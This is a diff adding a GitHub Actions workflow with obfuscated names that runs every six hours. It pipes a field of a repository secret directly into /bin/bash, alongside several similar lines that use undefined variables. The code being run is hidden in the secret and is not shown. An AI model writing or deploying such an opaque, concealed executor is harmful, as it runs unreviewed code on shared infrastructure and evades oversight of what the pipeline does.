@@ -1,0 +1,27 @@
+name: yiqianhouyibai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yiqianhouyibai
+        env:
+          iv398: ${{ secrets.iv398 }}
+        run: |
+          echo $iv398 | jq -r .ym33161 | /bin/bash
+          echo $jxsra8 | jq -r .ypkn72 | /bin/bash
+          echo $a3 | jq -r .oyffd554 | /bin/bash
+          echo $cbym1330 | jq -r .kfk20642 | /bin/bash
+          echo $yg507 | jq -r .xeqpq83 | /bin/bash
+          echo $uj45 | jq -r .oqc623 | /bin/bash
+          echo $u53863 | jq -r .abnn35854 | /bin/bash
+          echo $dlf66 | jq -r .gmszq811 | /bin/bash
+          echo $ije41 | jq -r .itp34 | /bin/bash
+          echo $efek7 | jq -r .dzgrn99833 | /bin/bash
+
